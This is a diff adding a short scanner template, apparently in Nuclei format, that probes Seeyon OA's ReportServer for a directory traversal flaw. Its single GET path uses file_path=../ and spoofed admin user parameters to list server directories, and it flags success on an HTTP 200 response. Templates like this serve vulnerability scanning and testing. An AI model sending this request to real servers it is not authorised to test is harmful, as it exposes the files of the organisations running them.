@@ -1,0 +1,17 @@
+id: yaml-poc-seeyon-seeyon_oa-directory_traversal-CT-469708
+info:
+  name: Yaml Poc Seeyon Seeyon_Oa Directory_Traversal Ct 469708
+  author: converted
+  severity: medium
+  description: 'Converted from xpoc: yaml-poc-seeyon-seeyon_oa-directory_traversal-CT-469708'
+  tags: traversal
+  reference: []
+http:
+- method: GET
+  path:
+  - /seeyonreport/ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=../&currentUserName=admin&currentUserId=1&isWebReport=true
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
